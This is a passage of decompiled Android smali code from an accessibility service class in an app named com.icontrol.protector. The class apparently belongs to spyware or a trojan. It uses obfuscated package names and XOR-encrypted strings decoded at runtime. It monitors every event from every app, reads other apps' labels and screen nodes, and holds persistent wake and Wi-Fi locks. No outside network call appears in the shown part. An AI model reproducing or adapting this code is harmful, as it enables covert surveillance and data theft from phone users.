    invoke-virtual {v0, v4}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v0

    check-cast v0, Ljava/lang/String;
    :try_end_b
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_b .. :try_end_b} :catch_8
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_6

    goto :goto_e

    :catch_8
    move-exception v0

    :try_start_c
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    const/16 v4, 0xd

    new-array v0, v4, [B

    fill-array-data v0, :array_47

    new-array v3, v3, [B

    fill-array-data v3, :array_48

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    goto :goto_e

    :cond_25
    const/4 v4, 0x5

    new-array v0, v4, [B

    fill-array-data v0, :array_49

    new-array v3, v3, [B

    fill-array-data v3, :array_4a

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    :goto_e
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    invoke-virtual {v1, v0, v8, v2}, Lcom/icontrol/protector/AccessServices;->d(Ljava/lang/String;ILandroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_6

    goto :goto_10

    :goto_f
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_10
    if-eqz v7, :cond_26

    :try_start_d
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto :goto_11

    :catch_9
    move-exception v0

    goto :goto_12

    :cond_26
    :goto_11
    if-eqz v5, :cond_27

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_9

    goto :goto_13

    :goto_12
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_27
    :goto_13
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x7da77189 -> :sswitch_5
        -0x26c1db68 -> :sswitch_4
        -0xbbd2166 -> :sswitch_3
        0x258ff780 -> :sswitch_2
        0x6ab862ea -> :sswitch_1
        0x7b318059 -> :sswitch_0
    .end sparse-switch

    :array_0
    .array-data 1
        0x27t
        0x7t
        0x38t
        0x4ft
        -0x2et
        -0xbt
        0x18t
        -0x80t
    .end array-data

    :array_1
    .array-data 1
        0x4ct
        0x62t
        0x41t
        0x28t
        -0x59t
        -0x6ct
        0x6at
        -0x1ct
    .end array-data

    :array_2
    .array-data 1
        -0x3bt
        -0x27t
        0x16t
        -0x2dt
        -0x66t
        -0x47t
        -0x30t
        0x53t
    .end array-data

    :array_3
    .array-data 1
        -0x56t
        -0x49t
        0x75t
        -0x74t
        -0x8t
        -0x33t
        -0x5et
        0x2at
    .end array-data

    :array_4
    .array-data 1
        -0x2at
        -0x30t
        -0x7dt
        0x6dt
        -0x6bt
        0x6ft
        -0x57t
        -0x65t
    .end array-data

    :array_5
    .array-data 1
        -0x47t
        -0x42t
        -0x20t
        0x32t
        -0x9t
        0x1bt
        -0x25t
        -0x1et
    .end array-data

    :array_6
    .array-data 1
        0x71t
        -0x1t
        -0x47t
        0x3t
        -0x5ct
        -0x2t
        -0x76t
        -0x76t
        0x6ct
        -0x1et
        -0x20t
        0x32t
        -0x3ft
        -0x77t
        -0x56t
        -0x36t
        0x32t
        -0xbt
        -0x4dt
    .end array-data

    :array_7
    .array-data 1
        0x8t
        -0x7at
        -0x40t
        0x7at
        -0x77t
        -0x4dt
        -0x39t
        -0x59t
    .end array-data

    :array_8
    .array-data 1
        0x27t
        0x37t
        -0x11t
        0x6at
        -0xdt
        0x20t
        0x0t
        0x28t
        0x31t
        0x30t
        -0x11t
        0x7ft
        -0x7t
        0x3dt
        0x4at
        0x43t
        0x22t
        0x30t
        -0x1t
        0x4ct
        -0x7t
        0x31t
        0x10t
    .end array-data

    :array_9
    .array-data 1
        0x46t
        0x59t
        -0x75t
        0x18t
        -0x64t
        0x49t
        0x64t
        0x6t
    .end array-data

    :array_a
    .array-data 1
        -0x1dt
        -0x26t
        -0x70t
        -0xct
        -0x28t
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x6dt
        -0x41t
        -0x1et
        -0x6et
        -0x45t
        -0x17t
        -0x19t
        0x1ft
    .end array-data

    :array_c
    .array-data 1
        -0x32t
        0x35t
        -0x9t
        0x1dt
        0x12t
        0x1bt
        0x4ft
        -0x79t
    .end array-data

    :array_d
    .array-data 1
        -0x5ft
        0x5bt
        -0x6ct
        0x42t
        0x70t
        0x6ft
        0x3dt
        -0x2t
    .end array-data

    :array_e
    .array-data 1
        0x6dt
        0x73t
        0x9t
        0x18t
        0x1dt
        -0xdt
        -0x46t
        0x3at
    .end array-data

    :array_f
    .array-data 1
        -0x26t
        0x36t
        0x73t
        0x6t
        -0xft
        -0x10t
        -0x3t
    .end array-data

    :array_10
    .array-data 1
        -0x4at
        0x59t
        0x12t
        0x62t
        -0x70t
        -0x80t
        -0x73t
        0x1ft
    .end array-data

    :array_11
    .array-data 1
        -0x5at
        0x4t
        -0x23t
        -0x14t
        -0x27t
        0x2ft
        0x9t
        -0x7at
    .end array-data

    :array_12
    .array-data 1
        -0x37t
        0x6at
        -0x42t
        -0x4dt
        -0x45t
        0x5bt
        0x7bt
        -0x1t
    .end array-data

    :array_13
    .array-data 1
        0x70t
        0x31t
        0x75t
        -0x80t
        0x24t
        0x4bt
        0x24t
        -0x1et
    .end array-data

    :array_14
    .array-data 1
        0x2ft
        0x4ct
        -0x72t
        -0x4at
        -0xft
        -0x1at
        0x6et
        0x19t
    .end array-data

    :array_15
    .array-data 1
        0x4et
        0x20t
        -0x15t
        -0x3ct
        -0x7bt
        -0x79t
        0x1et
        0x69t
    .end array-data

    :array_16
    .array-data 1
        0x3at
        -0x70t
        0x7ct
        0x1ct
        0x4bt
        0x5dt
        0x6dt
        0x0t
    .end array-data

    :array_17
    .array-data 1
        -0x43t
        -0x33t
        0x41t
        0x33t
        0x7dt
        -0x42t
        -0x15t
    .end array-data

    :array_18
    .array-data 1
        -0x1at
        -0x51t
        0x2dt
        0x52t
        0x1et
        -0x2bt
        -0x4at
        0x16t
    .end array-data

    :array_19
    .array-data 1
        0x65t
        0x12t
        0x61t
        -0x37t
        0x4et
        0x23t
        0x25t
        0x71t
        0x63t
    .end array-data

    nop

    :array_1a
    .array-data 1
        0x3et
        0x66t
        0xet
        -0x51t
        0x3ct
        0x4ct
        0x4bt
        0x5t
    .end array-data

    :array_1b
    .array-data 1
        0x1ft
        0x62t
        -0x21t
        0x1at
        -0x76t
        -0x51t
        -0x6t
        0x6et
        0x23t
        0x5dt
    .end array-data

    nop

    :array_1c
    .array-data 1
        0x44t
        0x0t
        -0x4dt
        0x7bt
        -0x17t
        -0x3ct
        -0x69t
        0x1dt
    .end array-data

    :array_1d
    .array-data 1
        -0x77t
        -0x80t
        0x68t
        0xft
        0x7bt
        0x45t
        -0x68t
        0x44t
        -0x71t
    .end array-data

    nop

    :array_1e
    .array-data 1
        -0x2et
        -0x12t
        0x7t
        0x6dt
        0x17t
        0x24t
        -0x5t
        0x2ft
    .end array-data

    :array_1f
    .array-data 1
        0x64t
        -0x53t
        -0x47t
        -0x18t
        0x5ft
        -0x2t
        0x76t
        0xat
    .end array-data

    :array_20
    .array-data 1
        0x3ft
        -0x31t
        -0x28t
        -0x65t
        0x2ct
        -0x69t
        0x2t
        0x57t
    .end array-data

    :array_21
    .array-data 1
        0x5et
        0x3bt
        0x6dt
        0x19t
        -0x77t
        -0x16t
        -0x3ct
        0x69t
        0x71t
        0x8t
    .end array-data

    nop

    :array_22
    .array-data 1
        0x5t
        0x55t
        0x2t
        0x7bt
        -0x18t
        -0x67t
        -0x49t
        0x0t
    .end array-data

    :array_23
    .array-data 1
        0x7dt
        -0x72t
        0x4ct
        0x40t
        0x1ft
        0x44t
        0x4et
        -0x1ct
        0x6dt
        -0x6ft
        0x59t
        0x7ct
        0x10t
        0x74t
        0x46t
        -0x18t
    .end array-data

    :array_24
    .array-data 1
        0x1ft
        -0x1et
        0x2dt
        0x23t
        0x74t
        0x1bt
        0x28t
        -0x73t
    .end array-data

    :array_25
    .array-data 1
        0x28t
        0x26t
        0x55t
        0x5dt
        -0x44t
        -0x3dt
        0x5ft
    .end array-data

    :array_26
    .array-data 1
        0xbt
        0x16t
        0x65t
        0x6dt
        -0x74t
        -0xdt
        0x6ft
        0x78t
    .end array-data

    :array_27
    .array-data 1
        -0x10t
        -0x9t
        0x47t
        -0x61t
        -0x30t
        -0x3ft
        -0x1ft
        -0x55t
        -0x15t
        -0x18t
        0x52t
        -0x67t
        -0x2at
    .end array-data

    nop

    :array_28
    .array-data 1
        -0x6et
        -0x65t
        0x26t
        -0x4t
        -0x45t
        -0x62t
        -0x6et
        -0x21t
    .end array-data

    :array_29
    .array-data 1
        -0x14t
        -0x31t
        0x16t
        0xbt
    .end array-data

    :array_2a
    .array-data 1
        -0x27t
        -0x1ft
        0x74t
        0x7ft
        0x7bt
        0x53t
        0x2ft
        -0x1t
    .end array-data

    :array_2b
    .array-data 1
        -0x7dt
        0x23t
        0x56t
        -0xct
    .end array-data

    :array_2c
    .array-data 1
        -0x46t
        0xdt
        0x34t
        -0x80t
        0x58t
        0x7at
        -0x26t
        -0x36t
    .end array-data

    :array_2d
    .array-data 1
        -0x7bt
        0x6at
        0x48t
        0x3ct
    .end array-data

    :array_2e
    .array-data 1
        -0x43t
        0x44t
        0x2at
        0x48t
        -0x70t
        0x6ft
        -0x36t
        0x71t
    .end array-data

    :array_2f
    .array-data 1
        0x2at
        -0x16t
        -0x23t
        0x41t
    .end array-data

    :array_30
    .array-data 1
        0x1dt
        -0x3ct
        -0x41t
        0x35t
        0x3ft
        -0x7t
        0x5bt
        0x61t
    .end array-data

    :array_31
    .array-data 1
        0x51t
        -0x1et
        0x3ft
        -0x67t
        -0x37t
    .end array-data

    nop

    :array_32
    .array-data 1
        0x60t
        -0x2et
        0x11t
        -0x5t
        -0x43t
        -0x7at
        0x4ft
        -0x2at
    .end array-data

    :array_33
    .array-data 1
        0x65t
        0x12t
        0x73t
        0x48t
    .end array-data

    :array_34
    .array-data 1
        0x53t
        0x3ct
        0x11t
        0x3ct
        -0x40t
        -0x23t
        0x32t
        0x27t
    .end array-data

    :array_35
    .array-data 1
        0x3at
        0x9t
        0x49t
        0x4dt
    .end array-data

    :array_36
    .array-data 1
        0xet
        0x27t
        0x2bt
        0x39t
        -0x52t
        0x37t
        -0x14t
        0x60t
    .end array-data

    :array_37
    .array-data 1
        -0x22t
        0x58t
        0x67t
        -0x6t
        0x7dt
        0x61t
    .end array-data

    nop

    :array_38
    .array-data 1
        -0x70t
        0x3dt
        0x10t
        -0x49t
        0xet
        0x6t
        0x7bt
        0xbt
    .end array-data

    :array_39
    .array-data 1
        -0x55t
        -0x4ct
        -0x44t
        -0x25t
        -0x1t
        0x26t
    .end array-data

    nop

    :array_3a
    .array-data 1
        -0x1bt
        -0x2ft
        -0x35t
        -0x6at
        -0x74t
        0x41t
        0x6ft
        -0x36t
    .end array-data

    :array_3b
    .array-data 1
        -0x74t
        0x5at
        -0x6bt
        -0x15t
        0x6et
        -0x3et
        0x5at
        0x70t
        -0x7ft
        0x56t
        -0x63t
        -0x15t
        0x68t
        -0x32t
        0x42t
    .end array-data

    :array_3c
    .array-data 1
        -0x11t
        0x35t
        -0x8t
        -0x3bt
        0xct
        -0x55t
        0x34t
        0x11t
    .end array-data

    :array_3d
    .array-data 1
        0x78t
        0x15t
        -0x1t
        0x52t
        0x67t
        0x32t
        -0x60t
        0x37t
        0x72t
        0x15t
        -0x44t
        0x1bt
        0x61t
        0x27t
        -0x4ft
        0x3bt
        0x74t
    .end array-data

    nop

    :array_3e
    .array-data 1
        0x1bt
        0x7at
        -0x6et
        0x7ct
        0x0t
        0x53t
        -0x2ct
        0x52t
    .end array-data

    :array_3f
    .array-data 1
        0x44t
        0x65t
        -0x5ct
        0x3ct
        -0x23t
        -0x21t
        -0x3t
        -0x6bt
        0x3t
        0x69t
        -0x6t
        0x38t
    .end array-data

    :array_40
    .array-data 1
        0x2dt
        0x8t
        -0x76t
        0x48t
        -0x4et
        -0x4ct
        -0x68t
        -0x5t
    .end array-data

    :array_41
    .array-data 1
        0xdt
        -0x57t
        -0x2et
        -0x4bt
        -0x2t
        0x4ft
        -0x34t
        0x18t
        0xbt
        -0x4et
        -0x6ft
        -0x8t
        -0x5t
        0x57t
        -0x30t
        0x0t
        0x1t
        -0x18t
        -0x35t
        -0x17t
        -0x4t
        0x5dt
        -0x2ct
        0x15t
        0x1et
        -0x4at
    .end array-data

    nop

    :array_42
    .array-data 1
        0x6et
        -0x3at
        -0x41t
        -0x65t
        -0x77t
        0x2et
        -0x60t
        0x74t
    .end array-data

    :array_43
    .array-data 1
        0x26t
        -0xbt
        -0x5ft
        -0x8t
        -0x39t
        0x54t
        0x6bt
        -0x3t
        0x3bt
        -0x7t
        -0x41t
        -0x5at
        -0x3bt
        0x4et
        0x74t
        -0x9t
        0x24t
    .end array-data

    nop

    :array_44
    .array-data 1
        0x50t
        -0x64t
        -0x2ft
        -0x2at
        -0x56t
        0x2dt
        0x1ft
        -0x6et
    .end array-data

    :array_45
    .array-data 1
        -0x6ft
        -0x15t
        -0x5dt
        0x1et
        -0x21t
        -0x74t
        0xat
        0x46t
        -0x6dt
        -0x16t
        -0x17t
        0x1t
        -0x21t
        -0x75t
        0xft
    .end array-data

    :array_46
    .array-data 1
        -0xet
        -0x7ct
        -0x73t
        0x73t
        -0x50t
        -0x1et
        0x6bt
        0x68t
    .end array-data

    :array_47
    .array-data 1
        -0x78t
        -0x7ct
        -0x6dt
        -0x25t
        -0x2at
        -0x5at
        -0xet
        -0x54t
        -0x71t
        -0x65t
        -0x6at
        -0x6bt
        -0x4t
    .end array-data

    nop

    :array_48
    .array-data 1
        -0x37t
        -0xct
        -0x1dt
        -0x5t
        -0x68t
        -0x37t
        -0x7at
        -0x74t
    .end array-data

    :array_49
    .array-data 1
        -0x39t
        -0x2ft
        0x32t
        0x31t
        -0x2t
    .end array-data

    nop

    :array_4a
    .array-data 1
        -0x74t
        -0x41t
        0x5dt
        0x46t
        -0x70t
        0x67t
        -0x16t
        0xft
    .end array-data
.end method

.method public onCreate()V
    .locals 0

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    return-void
.end method

.method public onDestroy()V
    .locals 2

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;->d()V

    :cond_0
    :try_start_0
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->l:Landroid/os/PowerManager$WakeLock;

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->l:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    iput-object v1, p0, Lcom/icontrol/protector/AccessServices;->l:Landroid/os/PowerManager$WakeLock;

    :cond_1
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->n:Landroid/net/wifi/WifiManager$WifiLock;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->n:Landroid/net/wifi/WifiManager$WifiLock;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->release()V

    iput-object v1, p0, Lcom/icontrol/protector/AccessServices;->n:Landroid/net/wifi/WifiManager$WifiLock;
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_2
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->m:Ljava/lang/Thread;

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->m:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_3
    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->k:Ljava/lang/Thread;

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_4

    iget-object v0, p0, Lcom/icontrol/protector/AccessServices;->k:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_4
    return-void
.end method

.method public onInterrupt()V
    .locals 0

    return-void
.end method

.method public onRebind(Landroid/content/Intent;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Service;->onRebind(Landroid/content/Intent;)V

    return-void
.end method

.method public onServiceConnected()V
    .locals 23

    move-object/from16 v1, p0

    sput-object v1, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    const/16 v2, 0x8

    new-array v0, v2, [B

    fill-array-data v0, :array_0

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v1, v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const-string v3, ""

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v4, Lcom/icontrol/protector/AlertActivity;

    invoke-direct {v0, v1, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-array v4, v2, [B

    fill-array-data v4, :array_2

    new-array v5, v2, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v4, 0x10000000

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x40000000    # 2.0f

    invoke-virtual {v0, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v4, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const/16 v0, 0x120

    invoke-direct {v1, v0}, Lcom/icontrol/protector/AccessServices;->v(I)V

    new-instance v0, Lcom/icontrol/protector/EngineWorker;

    invoke-direct {v0}, Lcom/icontrol/protector/EngineWorker;-><init>()V

    sget-object v4, Lcom/icontrol/protector/AccessServices;->N:Lcom/icontrol/protector/AccessServices;

    invoke-virtual {v0, v4}, Lcom/icontrol/protector/EngineWorker;->f(Landroid/content/Context;)V

    :cond_0
    invoke-static/range {p0 .. p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/r2;->B(Lcom/icontrol/protector/AccessServices;)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/qq;->c()V

    invoke-direct/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->C()V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v4, 0x6

    const/4 v5, 0x1

    if-eq v0, v5, :cond_2

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/16 v6, 0xe

    if-ne v0, v6, :cond_1

    goto :goto_1

    :cond_1
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    sget v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/t30;->a:I

    invoke-virtual {v0, v3}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    :goto_0
    sput-object v0, Lcom/icontrol/protector/AccessServices;->O:Ljava/lang/String;

    goto :goto_2

    :cond_2
    :goto_1
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    sget v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/t30;->a:I

    invoke-virtual {v0, v6}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    new-array v6, v4, [B

    fill-array-data v6, :array_4

    new-array v7, v2, [B

    fill-array-data v7, :array_5

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :goto_2
    invoke-super/range {p0 .. p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    const/4 v0, 0x5

    const/4 v3, 0x4

    const/4 v6, 0x0

    :try_start_0
    new-array v7, v0, [B

    fill-array-data v7, :array_6

    new-array v8, v2, [B

    fill-array-data v8, :array_7

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/os/PowerManager;

    iget-object v8, v1, Lcom/icontrol/protector/AccessServices;->l:Landroid/os/PowerManager$WakeLock;

    if-eqz v8, :cond_3

    invoke-virtual {v8}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v8

    if-nez v8, :cond_4

    :cond_3
    const/16 v8, 0xc

    new-array v8, v8, [B

    fill-array-data v8, :array_8

    new-array v9, v2, [B

    fill-array-data v9, :array_9

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v5, v8}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v7

    iput-object v7, v1, Lcom/icontrol/protector/AccessServices;->l:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v7, v6}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V

    iget-object v7, v1, Lcom/icontrol/protector/AccessServices;->l:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v7}, Landroid/os/PowerManager$WakeLock;->acquire()V

    :cond_4
    iget-object v7, v1, Lcom/icontrol/protector/AccessServices;->n:Landroid/net/wifi/WifiManager$WifiLock;

    if-eqz v7, :cond_5

    invoke-virtual {v7}, Landroid/net/wifi/WifiManager$WifiLock;->isHeld()Z

    move-result v7

    if-nez v7, :cond_6

    :cond_5
    new-array v7, v3, [B

    fill-array-data v7, :array_a

    new-array v8, v2, [B

    fill-array-data v8, :array_b

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/net/wifi/WifiManager;

    const/16 v8, 0xb

    new-array v8, v8, [B

    fill-array-data v8, :array_c

    new-array v9, v2, [B

    fill-array-data v9, :array_d

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v5, v8}, Landroid/net/wifi/WifiManager;->createWifiLock(ILjava/lang/String;)Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v7

    iput-object v7, v1, Lcom/icontrol/protector/AccessServices;->n:Landroid/net/wifi/WifiManager$WifiLock;

    invoke-virtual {v7}, Landroid/net/wifi/WifiManager$WifiLock;->acquire()V

    :cond_6
    iget-object v7, v1, Lcom/icontrol/protector/AccessServices;->g:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;

    if-eqz v7, :cond_7

    invoke-virtual {v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h70;->c()V

    :cond_7
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-direct {v1, v7}, Lcom/icontrol/protector/AccessServices;->x(Landroid/content/Context;)V

    invoke-direct/range {p0 .. p0}, Lcom/icontrol/protector/AccessServices;->w()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const/4 v7, 0x0

    const/4 v8, -0x1

    :try_start_1
    new-instance v9, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v9}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    sget v10, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v11, 0x1e

    if-lt v10, v11, :cond_8

    const v10, 0x100807b

    iput v10, v9, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    goto :goto_3

    :cond_8
    const/16 v10, 0x7b

    iput v10, v9, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    :goto_3
    iput v8, v9, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I

    const-wide/16 v10, 0x0

    iput-wide v10, v9, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J

    iput-object v7, v9, Landroid/accessibilityservice/AccessibilityServiceInfo;->packageNames:[Ljava/lang/String;

    iput v8, v9, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I

    invoke-virtual {v1, v9}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    sput-object v1, Lcom/icontrol/protector/WorkServices;->j:Lcom/icontrol/protector/AccessServices;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    const/4 v9, 0x2

